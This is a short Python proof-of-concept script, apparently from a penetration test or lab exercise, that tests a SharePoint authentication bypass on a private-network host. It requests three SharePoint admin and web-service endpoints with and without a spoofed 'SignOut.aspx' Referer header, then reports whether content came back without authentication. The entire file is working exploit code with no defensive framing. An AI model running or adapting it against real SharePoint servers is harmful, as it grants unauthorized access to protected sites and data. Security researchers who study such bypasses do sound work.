#!/usr/bin/env python3
# Purpose: Verify authentication bypasses work and can access authenticated resources
# Outcome: Confirm bypasses by comparing with/without SignOut Referer

import requests

target = "http://10.10.10.166"

bypassed_endpoints = [
    "/_layouts/15/listedit.aspx",
    "/_layouts/15/Picker.aspx",
    "/_vti_bin/WebPartPages.asmx",
]

print("DETAILED VERIFICATION OF AUTHENTICATION BYPASSES")
print("="*80)

for endpoint in bypassed_endpoints:
    url = f"{target}{endpoint}"
    
    print(f"\nEndpoint: {endpoint}")
    print("-" * 80)
    
    # Test WITHOUT SignOut Referer (should require auth)
    print("\n[Test 1] WITHOUT SignOut Referer:")
    try:
        response_no_referer = requests.get(url, allow_redirects=False, timeout=5)
        print(f"  Status: {response_no_referer.status_code}")
        print(f"  WWW-Authenticate: {response_no_referer.headers.get('WWW-Authenticate', 'Not present')}")
    except Exception as e:
        print(f"  Error: {e}")
    
    # Test WITH SignOut Referer (should bypass auth)
    print("\n[Test 2] WITH SignOut Referer:")
    try:
        headers_with_referer = {"Referer": "/_layouts/SignOut.aspx"}
        response_with_referer = requests.get(url, headers=headers_with_referer, allow_redirects=False, timeout=5)
        print(f"  Status: {response_with_referer.status_code}")
        print(f"  Content-Type: {response_with_referer.headers.get('Content-Type', 'N/A')}")
        print(f"  Content-Length: {len(response_with_referer.content)} bytes")
        
        # Check if we got actual content (not just auth challenge)
        if response_with_referer.status_code == 200:
            content_preview = response_with_referer.text[:200].replace('\n', ' ').replace('\r', '')
            print(f"  Content preview: {content_preview}...")
            
            # Check for authenticated indicators
            if 'asp.net' in response_with_referer.text.lower() or 'sharepoint' in response_with_referer.text.lower():
                print("  ✅ CONFIRMED: Got SharePoint/ASP.NET content without authentication!")
            
    except Exception as e:
        print(f"  Error: {e}")
    
    print("\n" + "="*80)
